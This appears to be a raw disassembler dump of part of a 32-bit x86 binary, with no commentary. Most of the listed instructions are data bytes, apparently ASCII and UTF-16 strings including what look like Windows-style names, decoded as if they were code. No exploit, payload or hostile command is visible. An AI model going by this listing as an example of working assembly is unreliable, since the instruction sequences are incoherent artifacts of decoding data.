  42389a:	xor    BYTE PTR [ecx],dh
  42389c:	pop    edi
  42389d:	dec    edi
  42389e:	dec    esi
  42389f:	push   esp
  4238a0:	cmp    BYTE PTR [eax],al
  4238a2:	dec    esp
  4238a3:	xor    al,0x44
  4238a5:	xor    DWORD PTR [edi+0x4b],ebx
  4238a8:	xor    DWORD PTR [ebp+0x5f],eax
  4238ab:	pop    edx
  4238ac:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238b0:	pop    edi
  4238b1:	inc    edx
  4238b2:	xor    dh,BYTE PTR [ecx]
  4238b4:	push   ebx
  4238b5:	xor    DWORD PTR [ecx],edi
  4238b7:	inc    edx
  4238b8:	add    BYTE PTR [edi+0x45],al
  4238bb:	xor    al,0x38
  4238bd:	xor    BYTE PTR [eax],dh
  4238bf:	pop    edi
  4238c0:	dec    edx
  4238c1:	dec    ebx
  4238c2:	xor    eax,0x33345f4d
  4238c7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238cb:	pop    edi
  4238cc:	aaa    
  4238cd:	push   esi
  4238ce:	dec    ebx
  4238cf:	push   edx
  4238d0:	pop    edi
  4238d1:	inc    ebx
  4238d2:	add    BYTE PTR [edx+0x35],bl
  4238d5:	dec    ebp
  4238d6:	pop    edi
  4238d7:	inc    edi
  4238d8:	dec    esi
  4238d9:	xor    al,0x49
  4238db:	xor    eax,0x54590035
  4238e0:	push   edx
  4238e1:	pop    edi
  4238e2:	push   esp
  4238e3:	inc    ebx
  4238e4:	inc    ecx
  4238e5:	pop    edi
  4238e6:	cmp    DWORD PTR [ecx+0x41],ebx
  4238e9:	push   ebp
  4238ea:	pop    edi
  4238eb:	push   ebp
  4238ec:	inc    ebp
  4238ed:	add    BYTE PTR [esi+esi*1+0x35],cl
  4238f1:	pop    edi
  4238f2:	pop    eax
  4238f3:	dec    edx
  4238f4:	inc    edx
  4238f5:	inc    edi
  4238f6:	add    BYTE PTR [edx+0x36],al
  4238f9:	inc    ebx
  4238fa:	pop    edi
  4238fb:	xor    BYTE PTR ds:0x36464b,dh
  423901:	dec    ebx
  423902:	cmp    DWORD PTR [esi+0x37],eax
  423905:	xor    ebx,DWORD PTR [edi+0x35]
  423908:	ss inc edi
  42390a:	pop    ecx
  42390b:	dec    eax
  42390c:	pop    ecx
  42390d:	add    BYTE PTR [ebp+0x35],cl
  423910:	push   eax
  423911:	xor    BYTE PTR [edi+0x4f],bl
  423914:	pop    ecx
  423915:	xor    cl,BYTE PTR [edi+0x0]
  423918:	pop    ecx
  423919:	xor    DWORD PTR [esi+0x5f],ecx
  42391c:	xor    al,BYTE PTR [edx+0x30]
  42391f:	push   esi
  423920:	push   esp
  423921:	inc    ebp
  423922:	add    BYTE PTR [edi+0x37],al
  423925:	push   esi
  423926:	xor    DWORD PTR [edi+0x49],ebx
  423929:	xor    al,BYTE PTR [esi+0x30]
  42392c:	pop    edi
  42392d:	ss dec esi
  42392f:	cmp    BYTE PTR [eax],al
  423931:	pop    edx
  423932:	xor    eax,0x445f334b
  423937:	xor    BYTE PTR [eax],bh
  423939:	push   ecx
  42393a:	push   esi
  42393b:	xor    al,0x0
  42393d:	push   ebp
  42393e:	pop    eax
  42393f:	inc    edi
  423940:	xor    DWORD PTR [edi+0x39],ebx
  423943:	push   esp
  423944:	inc    ebx
  423945:	aaa    
  423946:	inc    esp
  423947:	add    BYTE PTR [edi+0x39],dl
  42394a:	ss pop edi
  42394c:	dec    eax
  42394d:	pop    edx
  42394e:	pop    ecx
  42394f:	inc    edi
  423950:	push   ebp
  423951:	pop    edi
  423952:	push   eax
  423953:	dec    eax
  423954:	inc    ebx
  423955:	add    BYTE PTR [ebp+0x0],dl
  423958:	xor    al,0x0
  42395a:	dec    edi
  42395b:	add    BYTE PTR [edi+0x0],bl
  42395e:	cmp    BYTE PTR [eax],al
  423960:	xor    al,BYTE PTR [eax]
  423962:	inc    ebx
  423963:	add    BYTE PTR [edx+0x0],bl
  423966:	inc    ebx
  423967:	add    BYTE PTR [edi],dh
  423969:	add    BYTE PTR [edi+0x0],bl
  42396c:	inc    ebx
  42396d:	add    BYTE PTR [eax+eax*1+0x0],al
  423971:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423975:	add    BYTE PTR [edx],dh
  423977:	add    BYTE PTR [edi+0x0],bl
  42397a:	cmp    BYTE PTR [eax],al
  42397c:	dec    esp
  42397d:	add    BYTE PTR [esi+0x0],dl
  423980:	pop    edi
  423981:	add    BYTE PTR [ecx+0x0],bl
  423984:	push   edx
  423985:	add    BYTE PTR [esi+0x0],dl
  423988:	xor    al,BYTE PTR [eax]
  42398a:	cmp    BYTE PTR [eax],al
  42398c:	pop    edi
  42398d:	add    BYTE PTR [edx+0x0],cl
  423990:	add    BYTE PTR [eax],al
  423992:	inc    edx
  423993:	add    BYTE PTR [eax+eax*1+0x46],cl
  423997:	add    BYTE PTR [edi+0x0],bl
  42399a:	xor    eax,DWORD PTR [eax]
  42399c:	inc    ebp
  42399d:	add    BYTE PTR [ecx+0x0],cl
  4239a0:	push   edx
  4239a1:	add    BYTE PTR [ecx],bh
  4239a3:	add    BYTE PTR [esi+0x0],dl
  4239a6:	add    BYTE PTR [eax],al
  4239a8:	dec    ebp
  4239a9:	add    BYTE PTR [edi],dh
  4239ab:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239af:	add    BYTE PTR [edx+0x0],cl
  4239b2:	pop    eax
  4239b3:	add    BYTE PTR [ebx],dh
  4239b5:	add    BYTE PTR [ecx],dh
  4239b7:	add    BYTE PTR [ebx+0x0],al
  4239ba:	add    BYTE PTR [eax],al
  4239bc:	dec    edi
  4239bd:	add    BYTE PTR [esi],dh
  4239bf:	add    BYTE PTR [eax+0x0],cl
  4239c2:	pop    edi
  4239c3:	add    BYTE PTR [eax],dh
  4239c5:	add    BYTE PTR [edi],dh
  4239c7:	add    BYTE PTR [ecx],dh
  4239c9:	add    BYTE PTR [edx+0x0],dl
  4239cc:	xor    eax,0x55000000
  4239d1:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4239d5:	add    BYTE PTR [edi+0x0],bl
  4239d8:	push   esp
  4239d9:	add    BYTE PTR [ecx+0x0],al
  4239dc:	cmp    DWORD PTR [eax],eax
  4239de:	pop    edi
  4239df:	add    BYTE PTR [ebx],dh
  4239e1:	add    BYTE PTR [eax],dh
  4239e3:	add    BYTE PTR [eax],bh
  4239e5:	add    BYTE PTR [edi+0x0],cl
  4239e8:	inc    ebx
  4239e9:	add    BYTE PTR ds:0x4d000000,dh
  4239ef:	add    BYTE PTR [esi+0x0],cl
  4239f2:	inc    ebp
  4239f3:	add    BYTE PTR [edi+0x0],bl
  4239f6:	push   esp
  4239f7:	add    BYTE PTR [esi+0x0],al
  4239fa:	cmp    BYTE PTR [eax],al
  4239fc:	push   ebx
  4239fd:	add    BYTE PTR [edx+0x0],bl
  423a00:	pop    edi
  423a01:	add    BYTE PTR [eax],dh
  423a03:	add    BYTE PTR [eax],bh
  423a05:	add    BYTE PTR [eax+0x0],cl
  423a08:	add    BYTE PTR [eax],al
  423a0a:	dec    esi
  423a0b:	add    BYTE PTR [edi+0x0],cl
  423a0e:	pop    edx
  423a0f:	add    BYTE PTR [edi+0x0],bl
  423a12:	add    BYTE PTR ss:[ecx+0x0],bl
  423a16:	dec    ebp
  423a17:	add    BYTE PTR [esi],dh
  423a19:	add    BYTE PTR [ebx],dh
  423a1b:	add    BYTE PTR [edi+0x0],bl
  423a1e:	xor    al,0x0
  423a20:	dec    esi
  423a21:	add    BYTE PTR [edx],dh
  423a23:	add    BYTE PTR [esi],dh
  423a25:	add    BYTE PTR [ecx],dh
  423a27:	add    BYTE PTR [eax],al
  423a29:	add    BYTE PTR [ebx+0x0],cl
  423a2c:	dec    eax
  423a2d:	add    BYTE PTR [eax],bh
  423a2f:	add    BYTE PTR [edi+0x0],bl
  423a32:	inc    esi
  423a33:	add    BYTE PTR [esi+0x0],al
  423a36:	push   esp
  423a37:	add    BYTE PTR [edi],dh
  423a39:	add    BYTE PTR [esi],dh
  423a3b:	add    BYTE PTR [edi+0x0],bl
  423a3e:	dec    esp
  423a3f:	add    BYTE PTR [ecx+0x0],bl
  423a42:	add    BYTE PTR [eax],al
  423a44:	push   ebx
  423a45:	add    BYTE PTR [ecx+0x0],bl
  423a48:	xor    BYTE PTR [eax],al
  423a4a:	pop    edi
  423a4b:	add    BYTE PTR [ecx],bh
  423a4d:	add    BYTE PTR [edx+0x0],dl
  423a50:	dec    eax
  423a51:	add    BYTE PTR [ecx+0x0],bl
  423a54:	xor    al,BYTE PTR [eax]
  423a56:	pop    edi
  423a57:	add    BYTE PTR [eax],dh
  423a59:	add    BYTE PTR [eax],al
  423a5b:	add    BYTE PTR [edx+0x0],al
  423a5e:	dec    edx
  423a5f:	add    BYTE PTR [esi+0x0],cl
  423a62:	xor    al,BYTE PTR [eax]
  423a64:	pop    edi
  423a65:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a69:	add    BYTE PTR [edx+0x0],dl
  423a6c:	xor    al,0x0
  423a6e:	dec    eax
  423a6f:	add    BYTE PTR [eax],al
  423a71:	add    BYTE PTR [ebp+0x0],dl
  423a74:	add    BYTE PTR ss:[ebp+0x0],cl
  423a78:	xor    DWORD PTR [eax],eax
  423a7a:	pop    edi
  423a7b:	add    BYTE PTR [esi],dh
  423a7d:	add    BYTE PTR [ecx+0x0],bl
  423a80:	push   ebp
  423a81:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423a85:	add    BYTE PTR [edi+0x0],cl
  423a88:	inc    esp
  423a89:	add    BYTE PTR [edi+0x0],dl
  423a8c:	push   ebx
  423a8d:	add    BYTE PTR [eax],al
  423a8f:	add    BYTE PTR [edx+0x0],bl
  423a92:	inc    ebx
  423a93:	add    BYTE PTR [ebp+0x0],dl
  423a96:	pop    edi
  423a97:	add    BYTE PTR [ecx],dh
  423a99:	add    BYTE PTR [ebp+0x0],al
  423a9c:	push   esp
  423a9d:	add    BYTE PTR [eax],dh
  423a9f:	add    BYTE PTR [eax],al
  423aa1:	add    BYTE PTR [eax],al
  423aa3:	add    BYTE PTR [eax],al
  423aa5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423aab:	inc    edx
  423aac:	add    BYTE PTR [eax],cl
  423aae:	add    BYTE PTR [edx+0x0],0xc
  423ab2:	add    BYTE PTR [edx+0x0],0x10
  423ab6:	add    BYTE PTR [edx+0x0],0x14
  423aba:	add    BYTE PTR [edx+0x0],0x18
  423abe:	add    BYTE PTR [edx+0x0],0x1c
  423ac2:	add    BYTE PTR [edx+0x0],0x20
  423ac6:	add    BYTE PTR [edx+0x0],0x24
  423aca:	add    BYTE PTR [edx+0x0],0x28
  423ace:	add    BYTE PTR [edx+0x0],0x0
	...
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	sbb    edi,DWORD PTR [edi+0x4d57]
  423aea:	add    BYTE PTR [eax],al
  423aec:	adc    bh,BYTE PTR [ebx]
  423aee:	add    al,BYTE PTR [eax]
  423af0:	add    DWORD PTR [eax],eax
  423af2:	add    BYTE PTR [eax],al
  423af4:	add    DWORD PTR [eax],eax
  423af6:	add    BYTE PTR [eax],al
  423af8:	add    DWORD PTR [eax],eax
  423afa:	add    BYTE PTR [eax],al
  423afc:	or     BYTE PTR [ebx],bh
  423afe:	add    al,BYTE PTR [eax]
  423b00:	or     al,0x3b
  423b02:	add    al,BYTE PTR [eax]
  423b04:	adc    BYTE PTR [ebx],bh
  423b06:	add    al,BYTE PTR [eax]
  423b08:	inc    esi
  423b09:	iret   
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	push   ds
  423b0d:	cmp    eax,DWORD PTR [edx]
  423b0f:	add    BYTE PTR [eax],al
  423b11:	add    BYTE PTR [edi+0x6f],dl
  423b14:	jb     0x423b7a
  423b16:	push   edi
  423b17:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b1e:	aas    
  423b1f:	inc    ebp
  423b20:	outs   dx,BYTE PTR ds:[esi]
  423b21:	jne    0x423b90
  423b23:	push   edi
  423b24:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b2b:	popa   
  423b2c:	je     0x423b97
  423b2e:	outs   dx,DWORD PTR ds:[esi]
  423b2f:	outs   dx,BYTE PTR ds:[esi]
  423b30:	jae    0x423b85
  423b32:	je     0x423b95
  423b34:	.byte 0x74
